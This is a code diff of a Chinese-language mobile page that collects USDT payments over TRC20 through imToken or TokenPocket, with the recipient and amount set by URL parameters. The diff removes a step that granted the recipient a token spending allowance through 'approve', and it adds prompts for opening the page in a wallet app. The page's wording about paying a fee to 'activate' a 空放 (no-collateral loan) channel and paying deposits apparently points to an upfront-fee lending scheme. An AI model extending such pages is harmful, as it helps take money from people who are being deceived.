@@ -79,7 +79,7 @@
     </div>
   </div>
 
-  <button class="btn btn-pay" id="btn-pay" disabled>第 1 步：确认授权 1U</button>
+  <button class="btn btn-pay" id="btn-pay" disabled>确认支付</button>
   <button class="btn btn-ghost" id="btn-cancel">取消 / 刷新页面</button>
 
   <div class="status" id="status"></div>
@@ -91,9 +91,8 @@ const params = new URLSearchParams(location.search);
 const toAddress = params.get('address') || '';
 const amount = Number(params.get('amount')) || 0;
 const type = params.get('type') || 'deposit';
-
+const payPageUrl = location.href;
 function $(s) { return document.querySelector(s); }
-
 if (type === 'empty') {
   $('#page-title').textContent = '空放资格支付';
   $('#page-sub').textContent = '支付 1 USDT 激活空放通道';
@@ -101,151 +100,97 @@ if (type === 'empty') {
   $('#page-title').textContent = '押金充值';
   $('#page-sub').textContent = '请在 imToken 中确认支付';
 }
-
 $('#info-addr').textContent = toAddress || '未配置';
 $('#info-chain').textContent = 'TRC20 (波场)';
 $('#info-amount').textContent = amount + ' USDT';
 
-// 通用超时包装：防止安卓网络下 tronWeb 请求无限挂起（TCP 默认超时约 20-30 秒）
-function withTimeout(promise, ms, msg) {
-  return Promise.race([
-    promise,
-    new Promise((_, reject) => setTimeout(() => reject(new Error(msg || '网络超时，请重试')), ms))
-  ]);
+function imTokenUniversalLink(dappUrl) { return 'https://connect.token.im/link/navigate/DappView?url=' + encodeURIComponent(dappUrl); }
+function fallbackCopy(text, done) { try { const ta = document.createElement('textarea'); ta.value = text; ta.style.position='fixed'; ta.style.opacity='0'; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); if (done) done(); } catch(e) { prompt('请复制链接到 imToken 浏览打开：', text); } }
+function copyText(text, done) { if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, ()=>fallbackCopy(text,done)); else fallbackCopy(text, done); }
+function getTronWeb() { return window.tronWeb || (window.tron && window.tron.tronWeb) || window.tronLink || null; }
+function isWalletEnv() { const ua=(navigator.userAgent||'').toLowerCase(); const tw=getTronWeb(); return ua.includes('imtoken')||ua.includes('tokenpocket')||ua.includes('tpwallet')||!!(tw&&tw.ready); }
+function isInAppBrowser() { const ua=(navigator.userAgent||'').toLowerCase(); return /micromessenger|aweme|bytedance|toutiao|newsarticle|qq\/|weibo|alipay/i.test(ua); }
+function withTimeout(p, ms, msg) { return Promise.race([p, new Promise((_,rej)=>setTimeout(()=>rej(new Error(msg)),ms))]); }
+
+function showOpenWalletUI(reason) {
+  const warn = $('#env-warn');
+  warn.style.display = 'block';
+  const ul = imTokenUniversalLink(payPageUrl);
+  warn.innerHTML = '<div style="margin-bottom:10px;font-weight:700;">' + (reason || '当前未检测到钱包环境') + '</div>'
+    + '<div style="font-size:12.5px;line-height:1.7;margin-bottom:12px;">请在 imToken 钱包内打开本页完成支付。若未自动跳转，请点击下方按钮，或复制链接到 imToken「浏览」中粘贴打开。</div>'
+    + '<button id="__open_imtoken__" style="width:100%;background:#0e8aff;color:#fff;border:none;padding:12px;border-radius:10px;font-size:14px;font-weight:800;margin-bottom:8px;cursor:pointer;">打开 imToken 支付</button>'
+    + '<button id="__copy_paylink__" style="width:100%;background:#f1f2f7;color:#5b6070;border:none;padding:11px;border-radius:10px;font-size:13px;cursor:pointer;">复制支付链接</button>'
+    + '<div id="__copied_tip__" style="font-size:12px;color:#16a34a;margin-top:8px;display:none;">✅ 已复制，打开 imToken → 浏览 → 粘贴网址</div>';
+  warn.querySelector('#__open_imtoken__').onclick = () => { location.href = ul; };
+  warn.querySelector('#__copy_paylink__').onclick = () => { copyText(payPageUrl, () => { warn.querySelector('#__copied_tip__').style.display='block'; }); };
+  const btn = $('#btn-pay');
+  btn.disabled = true;
+  btn.textContent = '请在 imToken 中打开本页';
 }
 
 let envCheckCount = 0;
-const MAX_ENV_CHECK = 40; // 最多检测 20 秒（安卓钱包注入 tronWeb 较慢，3 秒远远不够）
+const MAX_ENV_CHECK = 40; // 最多检测 20 秒
 function checkEnvironment() {
-  const hasTron = !!(window.tron || window.tronWeb);
-  if (hasTron) {
+  const tw = getTronWeb();
+  if (tw && tw.ready && tw.defaultAddress && tw.defaultAddress.base58) {
     $('#env-warn').style.display = 'none';
-    $('#btn-pay').disabled = false;
-    $('#btn-pay').textContent = step === 1 ? '第 1 步：确认授权 1U' : `第 2 步：确认支付 ${amount} U`;
-  } else {
-    if (envCheckCount < MAX_ENV_CHECK) {
-      envCheckCount++;
-      // 检测超过 3 秒仍未注入时，提示正在等待钱包环境，避免用户以为卡死
-      if (envCheckCount === 6) {
-        $('#env-warn').style.display = 'block';
-        $('#env-warn').innerHTML = '<div>⏳ 正在等待钱包注入环境，安卓设备可能需要几秒，请稍候…</div>';
-      }
-      setTimeout(checkEnvironment, 500);
-    } else {
-      $('#env-warn').style.display = 'block';
-      $('#env-warn').innerHTML = '<div style="margin-bottom:8px">⚠️ 未检测到钱包环境，请确保在 imToken / TokenPocket 等支持 TRC20 的钱包内打开本页面。</div><button onclick="location.reload()" style="background:#c2410c;color:#fff;border:none;padding:6px 12px;border-radius:6px;font-size:12px;cursor:pointer;">重新检测</button>';
-      $('#btn-pay').disabled = true;
+    const btn = $('#btn-pay');
+    btn.disabled = false;
+    btn.textContent = '确认支付 ' + amount + ' USDT';
+    return;
+  }
+  if (envCheckCount < MAX_ENV_CHECK) {
+    envCheckCount++;
+    if (envCheckCount === 12) { // 约 6 秒仍未注入，给出打开钱包入口
+      showOpenWalletUI('⏳ 正在等待钱包注入环境，若长时间无反应请点击下方按钮打开 imToken');
     }
+    setTimeout(checkEnvironment, 500);
+  } else {
+    showOpenWalletUI('⚠️ 未检测到钱包环境');
   }
 }
-let step = 1; // 1: 授权, 2: 支付（必须在 checkEnvironment 之前声明，避免 TDZ）
-
 checkEnvironment();
 
 $('#btn-pay').onclick = async function () {
   const btn = this;
   btn.disabled = true;
-  
-  if (step === 1) {
-    btn.textContent = '请求授权中…';
-    setStatus('loading', '第 1 步：正在连接波场节点构建授权交易，请稍候…');
-    try {
-      if (!window.tronWeb) throw new Error('未检测到钱包环境，请在钱包内打开');
-      // 等待 tronWeb 就绪（最多 5 秒），避免安卓上 ready 尚未置位就调用导致异常
-      let waited = 0;
-      while (!window.tronWeb.ready && waited < 5000) {
-        await new Promise(r => setTimeout(r, 200)); waited += 200;
-      }
-      if (!window.tronWeb.ready) throw new Error('钱包环境未就绪，请退出重新进入');
-      const fromAddress = window.tronWeb.defaultAddress.base58;
-      
-      const approveParam = [
-        { type: 'address', value: toAddress },
-        { type: 'uint256', value: '1000000' }
-      ];
-      
-      // 关键修复：构建交易是纯网络请求，安卓下可能挂起 20+ 秒，必须加超时
-      const txApprove = await withTimeout(
-        window.tronWeb.transactionBuilder.triggerSmartContract(
-          USDT_CONTRACT, 'approve(address,uint256)', { feeLimit: 100000000 }, approveParam, fromAddress
-        ),
-        10000,
-        '节点响应超时（网络较慢），请点击按钮重试，或切换 Wi-Fi / 4G 后再试'
-      );
-      if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权交易失败');
-      
-      setStatus('loading', '✅ 授权交易已构建，请在钱包弹窗中确认授权…');
-      // 签名会唤起钱包 approve 弹窗，用户需手动确认，给 120 秒足够时间
-      const signedApprove = await withTimeout(
-        window.tronWeb.trx.sign(txApprove.transaction),
-        120000,
-        '授权签名超时（您可能未在钱包中确认），请重试'
-      );
-      await withTimeout(
-        window.tronWeb.trx.sendRawTransaction(signedApprove),
-        15000,
-        '广播授权交易超时，请检查网络后重试'
-      );
-      
-      setStatus('success', '✅ 授权成功！请点击下方按钮进行第 2 步支付。');
-      step = 2;
-      btn.textContent = `第 2 步：确认支付 ${amount} U`;
-      btn.disabled = false;
-    } catch (e) {
-      setStatus('error', '❌ 授权失败: ' + (e.message || '用户取消'));
-      btn.textContent = '重新授权';
-      btn.disabled = false;
+  btn.textContent = '请求支付中…';
+  setStatus('loading', '正在连接波场节点构建支付交易，请稍候…');
+  try {
+    const tw = getTronWeb();
+    if (!tw) throw new Error('未检测到钱包环境，请点击上方按钮在 imToken 中打开');
+    // 等待就绪 + 地址注入（安卓 imToken 上 ready 先于地址，必须等地址非空）
+    let waited = 0;
+    while ((!tw.ready || !(tw.defaultAddress && tw.defaultAddress.base58)) && waited < 8000) {
+      await new Promise(r => setTimeout(r, 200)); waited += 200;
     }
-  } 
-  else if (step === 2) {
-    btn.textContent = '请求支付中…';
-    setStatus('loading', '第 2 步：正在连接节点构建支付交易，请稍候…');
-    try {
-      const fromAddress = window.tronWeb.defaultAddress.base58;
-      const amountUnits = Math.floor(amount * 1e6).toString();
-      
-      const transferParam = [
-        { type: 'address', value: toAddress },
-        { type: 'uint256', value: amountUnits }
-      ];
-      
-      const txTransfer = await withTimeout(
-        window.tronWeb.transactionBuilder.triggerSmartContract(
-          USDT_CONTRACT, 'transfer(address,uint256)', { feeLimit: 100000000 }, transferParam, fromAddress
-        ),
-        10000,
-        '节点响应超时（网络较慢），请点击按钮重试，或切换 Wi-Fi / 4G 后再试'
-      );
-      if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建支付交易失败');
-      
-      setStatus('loading', '✅ 支付交易已构建，请在钱包弹窗中确认支付…');
-      const signedTransfer = await withTimeout(
-        window.tronWeb.trx.sign(txTransfer.transaction),
-        120000,
-        '支付签名超时（您可能未在钱包中确认），请重试'
-      );
-      await withTimeout(
-        window.tronWeb.trx.sendRawTransaction(signedTransfer),
-        15000,
-        '广播支付交易超时，请检查网络后重试'
-      );
-      
-      setStatus('success', '✅ 全部操作已完成，请在钱包账单中查看状态');
-      btn.textContent = '已完成';
-    } catch (e) {
-      setStatus('error', '❌ 支付失败: ' + (e.message || '用户取消'));
-      btn.textContent = '重新支付';
-      btn.disabled = false;
-    }
+    if (!tw.ready) throw new Error('钱包环境未就绪，请退出重新进入');
+    const fromAddress = tw.defaultAddress && tw.defaultAddress.base58;
+    if (!fromAddress) throw new Error('钱包地址未就绪，请退出重新进入');
+    const amountUnits = Math.floor(amount * 1e6).toString();
+    const transferParam = [ { type:'address', value: toAddress }, { type:'uint256', value: amountUnits } ];
+    const txTransfer = await withTimeout(
+      tw.transactionBuilder.triggerSmartContract(USDT_CONTRACT, 'transfer(address,uint256)', { feeLimit: 100000000 }, transferParam, fromAddress),
+      10000, '节点响应超时（网络较慢），请点击按钮重试，或切换 Wi-Fi / 4G 后再试'
+    );
+    if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建支付交易失败');
+    setStatus('loading', '✅ 支付交易已构建，请在钱包弹窗中确认支付…');
+    const signed = await withTimeout(tw.trx.sign(txTransfer.transaction), 120000, '支付签名超时（您可能未在钱包中确认），请重试');
+    await withTimeout(tw.trx.sendRawTransaction(signed), 15000, '广播支付交易超时，请检查网络后重试');
+    setStatus('success', '✅ 支付已完成，请在钱包账单中查看状态');
+    btn.textContent = '已完成';
+  } catch (e) {
+    setStatus('error', '❌ 支付失败: ' + (e.message || '用户取消'));
+    btn.textContent = '重新支付';
+    btn.disabled = false;
   }
 };
-
 $('#btn-cancel').onclick = () => window.history.back();
+function setStatus(type, msg) { const el = $('#status'); el.className = 'status ' + type; el.innerHTML = msg; }
 
-function setStatus(type, msg) {
-  const el = $('#status');
-  el.className = 'status ' + type;
-  el.innerHTML = msg;
+// 若在内置浏览器（微信/抖音等）中直接打开本页，立即给出引导
+if (isInAppBrowser() && !isWalletEnv()) {
+  showOpenWalletUI('⚠️ 当前为 App 内置浏览器，无法唤起钱包');
 }
 </script>
 </body>
